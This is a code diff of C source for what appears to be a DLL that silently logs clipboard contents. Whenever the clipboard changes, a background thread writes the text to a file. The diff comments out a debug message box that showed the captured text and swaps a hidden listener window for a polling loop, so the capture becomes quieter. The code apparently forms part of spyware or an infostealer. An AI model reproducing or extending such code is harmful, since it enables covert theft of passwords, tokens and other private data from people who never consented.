@@ -166,7 +166,7 @@ void ProcessClipboard() {
         if (pText != NULL) {
             FILE* f = NULL;
             if (fopen_s(&f, clipboardFilePath, "a+, ccs=UTF-8") == 0 && f) {
-                MessageBoxW(NULL, pText, L"Debug", MB_OK);
+                // MessageBoxW(NULL, pText, L"Debug", MB_OK);
                 fwprintf(f, L"\n[Clipboard Content]:%ls\n", pText);  
                 fclose(f);
             }
@@ -184,36 +184,16 @@ LRESULT CALLBACK ClipboardWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lPa
 }
 
 int ClipBoard(LPVOID lpParam) {
-    const wchar_t CLASS_NAME[] = L"MeowClipboardWatcher";
-    WNDCLASSW wc = { 0 };
-    wc.lpfnWndProc = ClipboardWndProc;
-    wc.hInstance = hDllInst; 
-    wc.lpszClassName = CLASS_NAME;
-    
-    if (!RegisterClassW(&wc)) {
-        // ShowDebugMsg("Debug", "Class Registration Failed", GetLastError());
-        return 0;
+    DWORD lastSequence = GetClipboardSequenceNumber();
+    // MessageBoxA(NULL, "Clipboard Thread Started!", "Debug", MB_OK);
+    while (true) {
+        DWORD currentSequence = GetClipboardSequenceNumber();
+        if (currentSequence != lastSequence) {
+            lastSequence = currentSequence;
+            ProcessClipboard(); 
+        }
+        Sleep(1000);
     }
-
-    HWND hwnd = CreateWindowExW(0, CLASS_NAME, L"", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hDllInst, NULL);
-    if (!hwnd) {
-        MessageBoxA(NULL, "Window Creation Failed", "Debug", MB_OK);
-        return 0;
-    }
-
-    if (AddClipboardFormatListener(hwnd)) {
-        // MessageBoxA(NULL, "Clipboard Listener Active", "Debug", MB_OK);
-    } else {
-        // MessageBoxA(NULL, "Failed to Add Listener", "Debug", MB_OK);
-    }
-
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg); 
-        DispatchMessage(&msg); 
-    }
-
-    RemoveClipboardFormatListener(hwnd);
     return 0;
 }
 
